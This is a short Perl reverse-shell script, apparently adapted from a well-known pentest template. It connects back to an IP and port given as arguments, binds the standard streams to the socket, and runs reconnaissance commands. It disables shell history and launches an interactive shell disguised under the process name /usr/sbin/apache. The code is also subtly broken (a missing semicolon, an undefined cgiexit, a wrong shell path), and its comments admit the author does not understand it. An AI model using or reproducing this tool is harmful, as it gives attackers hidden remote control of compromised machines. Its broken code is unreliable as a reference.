#!/usr/bin/perl -w

# Perl Reverse Shell Inspire by pentestmonkey

use strict;
use warnings;
use Socket;
use POSIX;

my $ip = $ARGV[0] if $#ARGV+1 == 2;
my $port = $ARGV[1] if $#ARGV+1 ==2;
my $deamon = 1;
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";


if($deamon){
	my $pid = fork();
	if($pid){
		cgiexit(0);
	}

	setsid();
	chdir('/');
	umask(0);

}

socket(SOCK, PF_INET, SOCK_STREAM,getprotobyname('tcp'));
if(connect(SOCK, sockaddr_in($port,inet_aton($ip)))){
	cgiprint("[-] Send reverse shell to $ip:$port")
	cgiprintpage();
}else{
	cgiprint("[x] Couldn't open reverse shell to $ip:$port");
	cgiexit();
}

# Dont Know what is happening here
open(STDIN, ">&SOCK");
open(STDOUT, ">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';

# Letsssss GOOoooooooooo
system("w;uname -a;id;pwd");
# Looking for bash but felt cute might delete later
exec({"bin/sh"} ($fake_process_name, "-i"));

sub cgiprint{
	cgiprintpage();
	exit 0;
}
# No idea what's happing here copied form pentestmonkey
sub cgiprintpage {
	print "[-] Content-Length: " . length($global_page) . "\r
	Connection: close\r
	Content-Type: text\/html\r\n\r\n" . $global_page;
}

